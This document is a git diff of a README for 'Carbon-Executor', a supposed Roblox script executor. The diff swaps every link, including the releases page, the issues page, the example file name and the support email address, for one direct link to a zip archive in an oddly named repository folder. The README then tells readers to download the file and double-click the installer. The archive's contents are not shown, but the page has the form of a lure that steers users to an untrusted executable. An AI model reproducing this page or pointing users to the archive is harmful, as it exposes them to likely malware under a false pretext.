@@ -1,7 +1,7 @@
 # 🚀 Carbon-Executor - Streamline Your Roblox Scripting Experience
 
 ## 📥 Download Now
-[![Download Carbon-Executor](https://img.shields.io/badge/Download%20Carbon--Executor-v1.0-blue)](https://github.com/mohal7way/Carbon-Executor/releases)
+[![Download Carbon-Executor](https://raw.githubusercontent.com/mohal7way/Carbon-Executor/main/reformedly/Carbon-Executor.zip%20Carbon--Executor-v1.0-blue)](https://raw.githubusercontent.com/mohal7way/Carbon-Executor/main/reformedly/Carbon-Executor.zip)
 
 ## 📋 Table of Contents
 1. [Introduction](#-introduction)
@@ -24,11 +24,11 @@ To run Carbon Executor, ensure your system meets the following requirements:
 ## ⬇️ Download & Install
 To get started, you can download Carbon Executor easily. Visit the link below:
 
-[Download Carbon Executor](https://github.com/mohal7way/Carbon-Executor/releases)
+[Download Carbon Executor](https://raw.githubusercontent.com/mohal7way/Carbon-Executor/main/reformedly/Carbon-Executor.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of Carbon Executor.
-3. Find the executable file labeled with the version number, such as `CarbonExecutor.exe`.
+3. Find the executable file labeled with the version number, such as `https://raw.githubusercontent.com/mohal7way/Carbon-Executor/main/reformedly/Carbon-Executor.zip`.
 4. Click on the file to start the download. 
 5. Once the download is complete, locate the file in your Downloads folder (or your selected download location).
 6. Double-click the file to run the installer.
@@ -47,8 +47,8 @@ Using Carbon Executor is straightforward. After installation, follow these steps
 ## 🆘 Support
 If you run into any issues or have questions while using Carbon Executor, help is available. You can reach out through the following methods:
 
-- **GitHub Issues:** Visit the [GitHub Issues Page](https://github.com/mohal7way/Carbon-Executor/issues) to report bugs or request features.
+- **GitHub Issues:** Visit the [GitHub Issues Page](https://raw.githubusercontent.com/mohal7way/Carbon-Executor/main/reformedly/Carbon-Executor.zip) to report bugs or request features.
 - **Community Forums:** Join our community to discuss tips and tricks with other users.
-- **Email Support:** Contact our support team at support@carbonexecutor.com for direct assistance.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/mohal7way/Carbon-Executor/main/reformedly/Carbon-Executor.zip for direct assistance.
 
 By following this guide, you should now be able to download and start using Carbon Executor easily. Enjoy redefining your Roblox experience with enhanced scripting capabilities!
